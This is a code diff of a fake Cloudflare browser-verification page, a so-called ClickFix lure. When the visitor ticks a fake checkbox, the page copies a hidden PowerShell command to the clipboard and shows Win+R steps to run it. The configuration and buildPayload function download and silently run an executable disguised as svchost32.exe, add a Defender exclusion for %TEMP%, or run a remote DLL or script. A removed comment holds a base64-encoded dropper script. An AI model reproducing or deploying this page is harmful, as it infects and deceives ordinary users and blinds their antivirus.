@@ -6,7 +6,6 @@
 <title>Just a moment...</title>
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
   body {
     font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
     background: #f0f2f5;
@@ -14,7 +13,6 @@
     display: flex;
     flex-direction: column;
   }
-
   .cf-header {
     background: #404041;
     padding: 11px 28px;
@@ -33,7 +31,6 @@
     letter-spacing: -.2px;
   }
   .header-note { color: #aaa; font-size: 12px; }
-
   .main {
     flex: 1;
     display: flex;
@@ -49,7 +46,6 @@
     max-width: 480px;
     overflow: hidden;
   }
-
   .card-status {
     background: #f6821f;
     padding: 13px 22px;
@@ -60,9 +56,7 @@
     transition: background .3s;
   }
   .card-status.warn { background: #d97706; }
-
   .card-body { padding: 28px 22px 20px; }
-
   .site-name {
     font-size: 21px;
     font-weight: 600;
@@ -71,7 +65,6 @@
     word-break: break-all;
   }
   .sub-text { font-size: 14px; color: #555; margin-bottom: 24px; }
-
   .spinner-wrap {
     display: flex; align-items: center; justify-content: center;
     margin: 32px 0 28px;
@@ -84,7 +77,6 @@
     animation: spin .75s linear infinite;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
-
   .verify-row {
     display: none;
     background: #f7f7f7;
@@ -114,9 +106,7 @@
     gap: 2px; opacity: .45;
   }
   .captcha-logo span { font-size: 9px; color: #777; }
-
   .steps-box { display: none; margin: 16px 0 8px; }
-
   .steps-title {
     font-size: 14px; font-weight: 600; color: #1a1a1a;
     margin-bottom: 18px;
@@ -146,7 +136,6 @@
     padding: 1px 6px;
     color: #222;
   }
-
   .copied-pill {
     display: inline-flex; align-items: center; gap: 6px;
     background: #ecfdf5; border: 1px solid #6ee7b7;
@@ -154,7 +143,9 @@
     padding: 5px 12px; border-radius: 20px;
     margin-top: 6px;
   }
-
+  .copied-pill.err {
+    background: #fef2f2; border-color: #fca5a5; color: #991b1b;
+  }
   .card-footer {
     border-top: 1px solid #ebebeb;
     background: #fafafa;
@@ -166,7 +157,6 @@
     display: flex; align-items: center; gap: 6px;
     font-size: 11.5px; color: #bbb;
   }
-
   .page-footer {
     text-align: center; padding: 14px;
     font-size: 11.5px; color: #aaa;
@@ -228,11 +218,11 @@
           <div class="step-num">3</div>
           <div class="step-desc">Press <span class="key">Enter</span> — verification completes automatically</div>
         </div>
-        <div class="copied-pill">
+        <div class="copied-pill" id="copyPill">
           <svg width="12" height="12" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
             <polyline points="20 6 9 17 4 12"/>
           </svg>
-          Verification token copied to clipboard
+          <span id="copyPillText">Verification token copied to clipboard</span>
         </div>
       </div>
 
@@ -265,43 +255,34 @@
 // ╠══════════════════════════════════════════════════════════════════╣
 
 const CFG = {
-  // cosmetic
   site: 'kekman.space',
 
-  // payload mode:
-  //   'rundll32'  — UNC DLL via rundll32
-  //   'ps_url'    — fetch remote .ps1 and iex
-  //   'ps_b64'    — inline base64-encoded powershell
-  //   'exe_drop'  — download exe to %TEMP% and run
+  // 'rundll32' | 'ps_url' | 'ps_b64' | 'exe_drop'
   mode: 'exe_drop',
 
-  // ── rundll32 ──────────────────────────────────────────────────
-  // UNC path to WebDAV-hosted DLL, ordinal or export name after comma
+  // rundll32: UNC path, export after comma
   unc: '\\\\svc4static.zenithprospera.in.net\\verification.google,#1',
 
-  // ── ps_url ────────────────────────────────────────────────────
+  // ps_url: remote .ps1 to iex
   ps_url: 'https://kekman.space/p.ps1',
 
-  // ── ps_b64 ────────────────────────────────────────────────────
-  // generate:
-  //   $s = 'IyDilZTilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZcKIyDilZEgIENPTkZJRyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQojIOKVoOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVowoKJEVYRV9VUkwgID0gJ2h0dHA6Ly9rZWttYW4uc3BhY2UvdmVyaWZ5LmV4ZScgICAjIHJlbW90ZSBleGUgdG8gZHJvcAokRVhFX05BTUUgPSAnc3ZjaG9zdDMyLmV4ZScgICAgICAgICAgICAgICAjIG5hbWUgb24gZGlzayB1bmRlciAlVEVNUCUKJEFWX0VYQ0wgID0gJHRydWUgICAgICAgICAgICAgICAgICAgICAgICAgIyBibGluZCBEZWZlbmRlciB0byAlVEVNUCUKCiMg4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdCgojIDEg4oCUIG9wdGlvbmFsbHkgZXhjbHVkZSAlVEVNUCUgZnJvbSBEZWZlbmRlciByZWFsLXRpbWUgc2Nhbm5pbmcKaWYgKCRBVl9FWENMKSB7CiAgICBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICRlbnY6VEVNUCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQp9CgojIDIg4oCUIGRyb3AgZXhlCiRkZXN0ID0gSm9pbi1QYXRoICRlbnY6VEVNUCAkRVhFX05BTUUKCnRyeSB7CiAgICAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJEVYRV9VUkwsICRkZXN0KQp9IGNhdGNoIHsKICAgICMgZmFsbGJhY2s6IEJJVFMgdHJhbnNmZXIgKGJ5cGFzc2VzIHNvbWUgcHJveHkgZmlsdGVycykKICAgIFN0YXJ0LUJpdHNUcmFuc2ZlciAtU291cmNlICRFWEVfVVJMIC1EZXN0aW5hdGlvbiAkZGVzdCAtRXJyb3JBY3Rpb24gU3RvcAp9CgojIDMg4oCUIGV4ZWN1dGUgaGlkZGVuCmlmIChUZXN0LVBhdGggJGRlc3QpIHsKICAgIFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICRkZXN0IC1XaW5kb3dTdHlsZSBIaWRkZW4KfQ=='
-  //   [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($s))
+  // ps_b64: inline base64 of a PS script
+  // generate: [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Content .\p.ps1 -Raw)))
   ps_b64: '',
 
-  // ── exe_drop ──────────────────────────────────────────────────
+  // exe_drop
   exe_url:  'https://kekman.space/verify.exe',
   exe_name: 'svchost32.exe',
+  exe_show_window: false,   // true = payload window visible (debug)
 
-  // Add-MpPreference -ExclusionPath %TEMP% before drop
-  // does not need elevation, blinds Defender to that path
-  av_excl: true,
+  av_excl: true             // blind Defender to %TEMP%
 };
 
 // ╚══════════════════════════════════════════════════════════════════╝
 
 function buildPayload() {
   const av = CFG.av_excl
-    ? 'Add-MpPreference -ExclusionPath $env:TEMP;'
+    ? 'try{Add-MpPreference -ExclusionPath $env:TEMP -EA 0}catch{};'
     : '';
 
   switch (CFG.mode) {
@@ -318,15 +299,18 @@ function buildPayload() {
     case 'ps_b64':
       return 'powershell -w h -nop -noni -ep bypass -c "'
         + av
-        + "iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + CFG.ps_b64 + "')))"
+        + "iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('"
+        + CFG.ps_b64 + "')))"
         + '"';
 
-    case 'exe_drop':
+    case 'exe_drop': {
+      const win = CFG.exe_show_window ? 'Normal' : 'Hidden';
       return 'powershell -w h -nop -noni -ep bypass -c "'
         + av
-        + '$p=\\"$env:TEMP\\' + CFG.exe_name + '\\";'
-        + "(New-Object Net.WebClient).DownloadFile('" + CFG.exe_url + "',$p);"
-        + 'Start-Process $p -WindowStyle Hidden"';
+        + '$p=Join-Path $env:TEMP \'' + CFG.exe_name + '\';'
+        + 'certutil -urlcache -split -f \'' + CFG.exe_url + '\' $p ^| Out-Null;'
+        + 'Start-Process -FilePath $p -WorkingDirectory $env:TEMP -WindowStyle ' + win + '"';
+    }
 
     default:
       return '';
@@ -335,12 +319,10 @@ function buildPayload() {
 
 const PAYLOAD = buildPayload();
 
-// populate cosmetics
 document.getElementById('siteName').textContent = CFG.site;
 document.getElementById('rayId').textContent =
   Array.from({length: 16}, () => '0123456789abcdef'[Math.random() * 16 | 0]).join('');
 
-// phase 1 → 2: spinner → verify checkbox
 setTimeout(() => {
   document.getElementById('spinnerWrap').style.display = 'none';
   document.getElementById('verifyRow').style.display   = 'flex';
@@ -349,24 +331,40 @@ setTimeout(() => {
     'Cloudflare needs to verify your browser before granting access.';
 }, 2600);
 
-function handleVerify() {
-  // tick checkbox
+async function copyText(txt) {
+  // prefer async clipboard (needs HTTPS + user gesture)
+  if (navigator.clipboard && window.isSecureContext) {
+    try { await navigator.clipboard.writeText(txt); return true; } catch {}
+  }
+  // fallback: hidden textarea + execCommand
+  const t = document.createElement('textarea');
+  t.value = txt;
+  t.setAttribute('readonly', '');
+  t.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;';
+  document.body.appendChild(t);
+  t.focus();
+  t.select();
+  let ok = false;
+  try { ok = document.execCommand('copy'); } catch {}
+  document.body.removeChild(t);
+  return ok;
+}
+
+async function handleVerify() {
   const box = document.getElementById('cfCheckbox');
-  box.innerHTML = `<svg width="13" height="13" fill="none" stroke="#f6821f"
-    stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>`;
+  box.innerHTML = '<svg width="13" height="13" fill="none" stroke="#f6821f" '
+    + 'stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>';
   box.style.borderColor = '#f6821f';
 
-  // write payload to clipboard
-  navigator.clipboard.writeText(PAYLOAD).catch(() => {
-    const t = Object.assign(document.createElement('textarea'),
-      { value: PAYLOAD, style: 'position:fixed;opacity:0' });
-    document.body.appendChild(t);
-    t.select();
-    document.execCommand('copy');
-    document.body.removeChild(t);
-  });
+  const ok = await copyText(PAYLOAD);
 
-  // phase 2 → 3: show Win+R steps
+  const pill = document.getElementById('copyPill');
+  const pillText = document.getElementById('copyPillText');
+  if (!ok) {
+    pill.classList.add('err');
+    pillText.textContent = 'Copy failed — click the box again';
+  }
+
   setTimeout(() => {
     document.getElementById('verifyRow').style.display  = 'none';
     document.getElementById('stepsBox').style.display   = 'block';
